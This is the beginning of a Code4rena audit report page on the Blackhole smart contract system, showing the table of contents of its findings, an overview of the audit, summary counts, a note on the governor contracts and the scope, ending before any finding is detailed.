<!DOCTYPE html><html lang="en" class="dark __variable_145019 __variable_7d3254 __variable_38ceec"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/aa1e03632b0a9f00.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/9942e0cbde34320f.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-ee83ff9cf0b0c89c.js"/><script src="/_next/static/chunks/fd9d1056-eb8d5211d3c9c065.js" async=""></script><script src="/_next/static/chunks/2117-a3b19a97c1cb31ce.js" async=""></script><script src="/_next/static/chunks/main-app-3138c406eafafcb7.js" async=""></script><script src="/_next/static/chunks/2972-f84899d403fe0acb.js" async=""></script><script src="/_next/static/chunks/app/reports/error-337d8165658cb655.js" async=""></script><script src="/_next/static/chunks/da2599a7-883aa94cd391c09d.js" async=""></script><script src="/_next/static/chunks/aaea2bcf-7a609d2a8547b978.js" async=""></script><script src="/_next/static/chunks/c16f53c3-1c73b34d2bc72b67.js" async=""></script><script src="/_next/static/chunks/0815f603-89dbad4b5756c5c4.js" async=""></script><script src="/_next/static/chunks/5878-bdbba189b5f619d7.js" async=""></script><script src="/_next/static/chunks/1700-bbc1d97db9b9492c.js" async=""></script><script src="/_next/static/chunks/2636-173262633c516a97.js" async=""></script><script src="/_next/static/chunks/3504-22e800882144201d.js" async=""></script><script src="/_next/static/chunks/4105-30871074ad2edc9d.js" async=""></script><script src="/_next/static/chunks/6390-77d8d06791482011.js" async=""></script><script src="/_next/static/chunks/6686-dd6382cfde9e8708.js" async=""></script><script src="/_next/static/chunks/5813-7499623caf5cc29b.js" async=""></script><script src="/_next/static/chunks/1638-02441f876b022d5b.js" async=""></script><script src="/_next/static/chunks/191-db678ccd3d1e6084.js" async=""></script><script src="/_next/static/chunks/867-ac7b2edcc9aa90cf.js" async=""></script><script src="/_next/static/chunks/7834-0fb33076adf039e3.js" async=""></script><script src="/_next/static/chunks/app/layout-bd3ec2013b0d95b1.js" async=""></script><script src="/_next/static/chunks/app/not-found-c0beac80bd3674ca.js" async=""></script><script src="/_next/static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js" async=""></script><title>Code4rena | Keeping high severity bugs out of production</title><meta name="description" content="Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours."/><meta name="application-name" content="Code4rena | Keeping high severity bugs out of production"/><meta property="og:title" content="Code4rena"/><meta property="og:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."/><meta property="og:site_name" content="Code4rena"/><meta property="og:image" content="https://code4rena.com/images/c4/c4-og-v2.png"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Code4rena"/><meta name="twitter:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."/><meta name="twitter:image" content="https://code4rena.com/images/c4/c4-og-v2.png"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="256x256"/><link rel="icon" href="/logos/c4/c4-favicon-32.png"/><link rel="apple-touch-icon" href="/logos/c4/apple-touch-icon.png"/><meta name="next-size-adjust"/><title>Blackhole</title><meta property="og:title" content="Blackhole"/><meta name="twitter:title" content="Blackhole"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="wrapper__grid"><div class="Toastify"></div><!--$--><!--/$--><header class="header full-width--padded "><a class="visually-hidden focusable skip-link" href="#skip-link">Skip Navigation</a><nav aria-label="Desktop Navigation" class="header__nav"><a class="logo" href="/"><img alt="Code4rena Logo" loading="lazy" width="143" height="28" decoding="async" data-nimg="1" style="color:transparent" src="/logos/c4/c4-logo.svg"/></a><ul class="header__nav-links"><div class="header__nav-separator"></div><li><button class="header__nav-link__btn" aria-haspopup="true" aria-expanded="false" aria-controls="for_projects_submenu" type="button">For Projects<svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-secondary)" fill-rule="evenodd" clip-rule="evenodd" d="M4.7636 8.2636C5.11508 7.91213 5.68492 7.91213 6.0364 8.2636L10.9 13.1272L15.7636 8.2636C16.1151 7.91213 16.6849 7.91213 17.0364 8.2636C17.3879 8.61508 17.3879 9.18492 17.0364 9.5364L11.5364 15.0364C11.1849 15.3879 10.6151 15.3879 10.2636 15.0364L4.7636 9.5364C4.41213 9.18492 4.41213 8.61508 4.7636 8.2636Z"></path></g></svg></button><div class="submenu__wrapper"><div id="for_projects_submenu" aria-hidden="true" aria-label="For Projects Submenu" class="header__nav-links__dropdown"><div class="dropdown__promo_parent"><div class="dropdown__promo"><div class="dropdown__promo_text"><h2>Ready to secure your project?</h2><p>The best time to start is now.</p></div><div class="dropdown__promo_button"><a target="_blank" rel="noreferrer noopener" class="" tabindex="-1" href="https://go.code4rena.com/start?source=header-nav"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Get started (opens in new window)"><div class="marketing-btn__text">Get started</div><svg width="16px" height="16px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M10.6803 4.2636C11.0317 3.91213 11.6016 3.91213 11.953 4.2636L18.3697 10.6803C18.5385 10.8491 18.6333 11.078 18.6333 11.3167C18.6333 11.5554 18.5385 11.7843 18.3697 11.9531L11.953 18.3697C11.6016 18.7212 11.0317 18.7212 10.6803 18.3697C10.3288 18.0183 10.3288 17.4484 10.6803 17.0969L15.5605 12.2167H4.89998C4.40293 12.2167 3.99998 11.8137 3.99998 11.3167C3.99998 10.8196 4.40293 10.4167 4.89998 10.4167H15.5605L10.6803 5.5364C10.3288 5.18492 10.3288 4.61508 10.6803 4.2636Z"></path></g></svg></button></a></div></div></div><div class="dropdown__content"><div class="dropdown__content__wrapper"><strong class="content__label__decorated_full">Security solutions</strong><ul class="dropdown__content__col decorated_full"><li><a aria-label="Competitive audit" class="dropdown__content__link__decorated__full" href="/competitive-audit"><div><div class="dropdown__content__link__label">Competitive audit</div><p class="dropdown__content__link__description">We invented the format that disrupted the web3 industry. Find out why top protocols trust C4.</p></div></a></li><li><a aria-label="Zenith" class="dropdown__content__link__decorated__full" href="/zenith"><div><div class="dropdown__content__link__label">Zenith</div><p class="dropdown__content__link__description">Zenith assembles auditors with proven track records to secure your project.</p></div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Resources</strong><ul class="dropdown__content__col simple"><li><a target="_blank" rel="noreferrer noopener" aria-label="Docs (opens in new window)" href="https://docs.code4rena.com"><div class="dropdown__content__link__label">Docs</div></a></li><li><a aria-label="Reports" href="/reports"><div class="dropdown__content__link__label">Reports</div></a></li></ul></div></div></div></div></li><li><button class="header__nav-link__btn" aria-haspopup="true" aria-expanded="false" aria-controls="for_wardens_submenu" type="button">For Wardens<svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-secondary)" fill-rule="evenodd" clip-rule="evenodd" d="M4.7636 8.2636C5.11508 7.91213 5.68492 7.91213 6.0364 8.2636L10.9 13.1272L15.7636 8.2636C16.1151 7.91213 16.6849 7.91213 17.0364 8.2636C17.3879 8.61508 17.3879 9.18492 17.0364 9.5364L11.5364 15.0364C11.1849 15.3879 10.6151 15.3879 10.2636 15.0364L4.7636 9.5364C4.41213 9.18492 4.41213 8.61508 4.7636 8.2636Z"></path></g></svg></button><div class="submenu__wrapper"><div id="for_wardens_submenu" aria-hidden="true" aria-label="For Wardens Submenu" class="header__nav-links__dropdown"><div class="dropdown__promo_parent"><div class="dropdown__promo"><div class="dropdown__promo_text"><h2>Find bugs. Get paid.</h2><p>Put your security research skills to work.</p></div><div class="dropdown__promo_button"><a class="" tabindex="-1" href="/register/account"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Become a Warden"><div class="marketing-btn__text">Become a Warden</div><svg width="16px" height="16px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M10.6803 4.2636C11.0317 3.91213 11.6016 3.91213 11.953 4.2636L18.3697 10.6803C18.5385 10.8491 18.6333 11.078 18.6333 11.3167C18.6333 11.5554 18.5385 11.7843 18.3697 11.9531L11.953 18.3697C11.6016 18.7212 11.0317 18.7212 10.6803 18.3697C10.3288 18.0183 10.3288 17.4484 10.6803 17.0969L15.5605 12.2167H4.89998C4.40293 12.2167 3.99998 11.8137 3.99998 11.3167C3.99998 10.8196 4.40293 10.4167 4.89998 10.4167H15.5605L10.6803 5.5364C10.3288 5.18492 10.3288 4.61508 10.6803 4.2636Z"></path></g></svg></button></a></div></div></div><div class="dropdown__content"><div class="dropdown__content__wrapper"><strong class="content__label__simple">Audits</strong><ul class="dropdown__content__col simple"><li><a aria-label="Ongoing audits" href="/audits#active-audits"><div class="dropdown__content__link__label">Ongoing audits</div></a></li><li><a aria-label="Upcoming audits" href="/audits#upcoming-audits"><div class="dropdown__content__link__label">Upcoming audits</div></a></li><li><a aria-label="Past audits" href="/audits#completed-audits"><div class="dropdown__content__link__label">Past audits</div></a></li><li><a aria-label="Bounties" href="/bounties"><div class="dropdown__content__link__label">Bounties</div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Leaderboard</strong><ul class="dropdown__content__col simple"><li><a aria-label="Past 90 days" href="/leaderboard?timeframe=Last 90 days"><div class="dropdown__content__link__label">Past 90 days</div></a></li><li><a aria-label="Past 365 days" href="/leaderboard?timeframe=Last 365 days"><div class="dropdown__content__link__label">Past 365 days</div></a></li><li><a aria-label="All time" href="/leaderboard?timeframe=All time"><div class="dropdown__content__link__label">All time</div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Resources</strong><ul class="dropdown__content__col simple"><li><a aria-label="Reports" href="/reports"><div class="dropdown__content__link__label">Reports</div></a></li><li><a aria-label="Help desk" href="/help"><div class="dropdown__content__link__label">Help desk</div></a></li><li><a target="_blank" rel="noreferrer noopener" aria-label="Docs (opens in new window)" href="https://docs.code4rena.com"><div class="dropdown__content__link__label">Docs</div></a></li><li><a target="_blank" rel="noreferrer noopener" aria-label="GitHub (opens in new window)" href="https://github.com/code-423n4/"><div class="dropdown__content__link__label">GitHub</div></a></li></ul></div></div></div></div></li><li class="header__user-help__wrapper"><a class="header__user-help" href="/help">Support</a></li><li class="header__user-login__wrapper"><a class="header__user-login" href="/login">Log in</a></li><div class="login__mobile"><h2>Login</h2><a class="login__link" href="/login"><img alt="login icon" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="login__icon" style="color:transparent" src="/images/sign-out.svg"/>Log in / Register</a></div><a target="_blank" rel="noreferrer noopener" class="spacing-bottom__m spacing-left__s" tabindex="-1" href="https://go.code4rena.com/start?source=header-nav"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Get an audit (opens in new window)"><div class="marketing-btn__text">Get an audit</div></button></a></ul></nav><nav aria-label="Mobile Navigation" class="header__nav__mobile"><div class="header__logo-and-burger"><a class="logo" href="/"><img alt="Code4rena Logo" loading="lazy" width="143" height="28" decoding="async" data-nimg="1" style="color:transparent" src="/logos/c4/c4-logo.svg"/></a><div class="mobile__nav__wrapper"><div class="mobile__nav__overlay"></div><div id="c4_mobile_nav" class="mobile__nav__body" aria-hidden="true"></div></div><button class="hamburger" aria-label="Open menu" aria-expanded="false" aria-controls="c4_mobile_nav" type="button"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="menu"><g id="Vector"><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 10.7333C2.99988 10.2362 3.40282 9.83325 3.89988 9.83325H18.5665C19.0636 9.83325 19.4665 10.2362 19.4665 10.7333C19.4665 11.2303 19.0636 11.6333 18.5665 11.6333H3.89988C3.40282 11.6333 2.99988 11.2303 2.99988 10.7333Z"></path><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 5.23325C2.99988 4.7362 3.40282 4.33325 3.89988 4.33325H18.5665C19.0636 4.33325 19.4665 4.7362 19.4665 5.23325C19.4665 5.73031 19.0636 6.13325 18.5665 6.13325H3.89988C3.40282 6.13325 2.99988 5.73031 2.99988 5.23325Z"></path><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 16.2333C2.99988 15.7362 3.40282 15.3333 3.89988 15.3333H18.5665C19.0636 15.3333 19.4665 15.7362 19.4665 16.2333C19.4665 16.7303 19.0636 17.1333 18.5665 17.1333H3.89988C3.40282 17.1333 2.99988 16.7303 2.99988 16.2333Z"></path></g></g></svg></button></div></nav><span id="skip-link"></span></header><main><div class="report-page"><div class="limited-width type__copy"><div class="type__article"><div class="logo-64"><img alt="Blackhole" loading="lazy" decoding="async" data-nimg="fill" class="rounded" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="80px" srcSet="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-GRH9BLXzGEX&amp;w=3840&amp;q=75"/></div><div class="report-header"><h1>Blackhole<!-- --> <br/> Findings &amp; Analysis Report</h1><h4>2025-07-03</h4></div><div class="report-container"><h2>Table of contents</h2><div class="report-toc markdown-body"><ul>
<li>
<p><a href="#overview">Overview</a></p>
<ul>
<li><a href="#about-c4">About C4</a></li>
</ul>
</li>
<li>
<p><a href="#summary">Summary</a></p>
<ul>
<li><a href="#governor-findings">Governor findings</a></li>
</ul>
</li>
<li><a href="#scope">Scope</a></li>
<li><a href="#severity-criteria">Severity Criteria</a></li>
<li>
<p><a href="#high-risk-findings-2">High Risk Findings (2)</a></p>
<ul>
<li><a href="#h-01-router-address-validation-logic-error-prevents-valid-router-assignment">[H-01] Router address validation logic error prevents valid router assignment</a></li>
<li><a href="#h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone">[H-02] Reward token in <code>GaugeFactoryCL</code> can be drained by anyone</a></li>
</ul>
</li>
<li>
<p><a href="#medium-risk-findings-13">Medium Risk Findings (13)</a></p>
<ul>
<li><a href="#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment">[M-01] <code>MinterUpgradeable</code>: double-subtracting smNFT burns causes rebase underpayment</a></li>
<li><a href="#m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles">[M-02] Critical access control flaw: Role removal logic incorrectly grants unauthorized roles</a></li>
<li><a href="#m-03-1e10-fixed-farming-reward-in-gaugefactorycl">[M-03] <code>1e10</code> fixed farming reward in <code>GaugeFactoryCL</code></a></li>
<li><a href="#m-04-logic-error-in-avm-original-owner-resolution">[M-04] Logic error in AVM original owner resolution</a></li>
<li><a href="#m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service">[M-05] Griefing attack on <code>GenesisPoolManager.sol::depositNativeToken</code> leading to Denial of Service</a></li>
<li><a href="#m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair">[M-06] First liquidity provider can DOS the pool of a stable pair</a></li>
<li><a href="#m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity">[M-07] <code>isGenesis</code>&nbsp;flag is ineffective to control add liquidity flow in <code>RouterV2.addLiquidity()</code></a></li>
<li><a href="#m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity">[M-08] Function return variable shadowing prevents storage updates in solidity</a></li>
<li><a href="#m-09-zero-receiver-fund-burn">[M-09] Zero-receiver fund burn</a></li>
<li><a href="#m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations">[M-10] ERC-2612 permit front-running in RouterV2 enables DoS of liquidity operations</a></li>
<li><a href="#m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata">[M-11] Incorrect function call in <code>BribeFactoryV3</code> <code>recoverERC20AndUpdateData</code></a></li>
<li><a href="#m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids">[M-12] Epoch voting restrictions bypassed via <code>deposit_for()</code> for blacklisted/non-whitelisted <code>tokenID</code>s</a></li>
<li><a href="#m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation">[M-13] EIP-712 domain type hash mismatch breaks signature-based delegation</a></li>
</ul>
</li>
<li><a href="#governor">Governor</a></li>
<li>
<p><a href="#medium-risk-findings-9">Medium Risk Findings (9)</a></p>
<ul>
<li><a href="#m-14-checkpoints-are-incorrectly-cleared-during-transferfrom">[M-14] Checkpoints are incorrectly cleared during <code>transferFrom</code></a></li>
<li><a href="#m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions">[M-15] <code>L2Governor.execute()</code> accepts <code>Expired</code> / <code>Defeated</code> proposals, attacker front-runs <code>BlackGovernor</code> <code>nudge()</code>, blocks legitimate emission-rate votes, freezes tail emissions</a></li>
<li><a href="#m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality">[M-16] <code>getVotes</code> inside the <code>BlackGovernor</code> incorrectly provides <code>block.number</code> instead of <code>block.timestamp</code>, leading to complete DOS of proposal functionality</a></li>
<li><a href="#m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again">[M-17] Users can cast their votes multiple times for the proposal by transferring their nfts and then voting again</a></li>
<li><a href="#m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality">[M-18] Status does not update inside the <code>BlackGovernor</code> leading to complete distribution of nudge functionality</a></li>
<li><a href="#m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease">[M-19] Quorum does not include the <code>againstVotes</code> leading to emissions rate staying the same even if it should decrease</a></li>
<li><a href="#m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote">[M-20] <code>getsmNFTPastVotes</code> incorrectly checks for Voting Power leading to some NFTs incorrectly being eligible to vote</a></li>
<li><a href="#m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold">[M-21] Governance emission adjustment ignored when weekly emission above tail threshold</a></li>
<li><a href="#m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch">[M-22] Governance deadlock potential in <code>BlackGovernor.sol</code> due to quorum mismatch</a></li>
</ul>
</li>
<li>
<p><a href="#low-risk-and-non-critical-issues">Low Risk and Non-Critical Issues</a></p>
<ul>
<li><a href="#01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively">01 Early returning in <code>_blacklist()</code> and <code>blacklistConnector</code> function prevents emission of blacklisted event and blacklistConnector event respectively</a></li>
<li><a href="#02-incomplete-implementation-of-purchased-function-in-auction-contract">02 Incomplete implementation of <code>purchased</code> function in Auction contract</a></li>
<li><a href="#03-stack-too-deep-error-in-inline-assembly-variable-headstart">03 Stack too deep error in inline assembly (variable <code>headStart</code>)</a></li>
<li><a href="#04-hardcoded-manager-lacks-ability-to-renounce-control">04 Hardcoded manager lacks ability to renounce control</a></li>
<li><a href="#05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft">05 Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT</a></li>
<li><a href="#06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks">06 <code>getVotes()</code> wiew function becomes unusable when a user owns too many locks</a></li>
<li><a href="#07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges">07 <code>distributeAll()</code> function at risk of repeated failure due to unbounded loop over gauges</a></li>
<li><a href="#08-fee-recipient-may-remain-set-to-previous-owner">08 Fee recipient may remain set to previous owner</a></li>
<li><a href="#09-incorrect-setrouter-function-only-allows-zero-address-to-pass">09 Incorrect <code>setRouter</code> function only allows zero address to pass</a></li>
<li><a href="#10-misaligned-access-control-on-settopnpools-function">10 Misaligned access control on <code>setTopNPools()</code> function</a></li>
<li><a href="#11-governancecentralization-risks-21-contracts-covered">11 Governance/centralization Risks (21 contracts covered)</a></li>
<li><a href="#12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol">12 Function declaration does not follow Solidity style guide at <code>FixedAuction.sol</code></a></li>
<li><a href="#13-incorrect-require-statement-for-address-check-at-gaugev2sol">13 Incorrect require statement for address check at <code>GaugeV2.sol</code></a></li>
</ul>
</li>
<li>
<p><a href="#mitigation-review">Mitigation Review</a></p>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#mitigation-review-scope--summary">Mitigation Review Scope &amp; Summary</a></li>
<li><a href="#m-05-unmitigated">[M-05] Unmitigated</a></li>
<li><a href="#m-10-unmitigated">[M-10] Unmitigated</a></li>
</ul>
</li>
<li><a href="#disclosures">Disclosures</a></li>
</ul></div><div class="report-contents markdown-body"><h1 style="position:relative;" id="overview"><a class="anchor before" aria-label="overview permalink" href="#overview"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Overview</h1>
<h2 style="position:relative;" id="about-c4"><a class="anchor before" aria-label="about c4 permalink" href="#about-c4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>About C4</h2>
<p>Code4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.</p>
<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>
<p>During the audit outlined in this document, C4 conducted an analysis of the Blackhole smart contract system. The audit took place from May 28 to June 09, 2025.</p>
<p>Following the C4 audit, 3 wardens (<a href="https://code4rena.com/@rayss">rayss</a>, <a href="https://code4rena.com/@lonelybones">lonelybones</a> and <a href="https://code4rena.com/@maxzuvex">maxzuvex</a>) reviewed the mitigations for all identified issues; the <a href="#mitigation-review">mitigation review report</a> is appended below the audit report.</p>
<p>Final report assembled by Code4rena.</p>
<h1 style="position:relative;" id="summary"><a class="anchor before" aria-label="summary permalink" href="#summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Summary</h1>
<p>The C4 analysis yielded an aggregated total of 24 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 22 received a risk rating in the category of MEDIUM severity.</p>
<p>Additionally, C4 analysis included 13 reports detailing issues with a risk rating of LOW severity or non-critical. </p>
<p>All of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Blackhole team.</p>
<h2 style="position:relative;" id="governor-findings"><a class="anchor before" aria-label="governor findings permalink" href="#governor-findings"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Governor findings</h2>
<p>Of the identified vulnerabilities, 5 medium severity findings were associated with the Governor contracts.</p>
<p>⚠️ The Blackhole team has decided not to deploy a governor contract at this time. </p>
<p>The sponsors have requested the following note be included:</p>
<blockquote>
<p>Blackhole has chosen not to deploy a governor contract at this stage. A more advanced version will be introduced later as per the roadmap, subject to a separate audit.</p>
</blockquote>
<p>C4 has included the related findings as a <a href="#governor">separate section</a> in this report. Original numbering is in continuous order for this section, for ease of reference.</p>
<h1 style="position:relative;" id="scope"><a class="anchor before" aria-label="scope permalink" href="#scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Scope</h1>
<p>The code under review can be found within the <a href="https://github.com/code-423n4/2025-05-audit-507">C4 Blackhole repository</a>, and is composed of 116 smart contracts written in the Solidity programming language and includes 10,108 lines of Solidity code.</p>
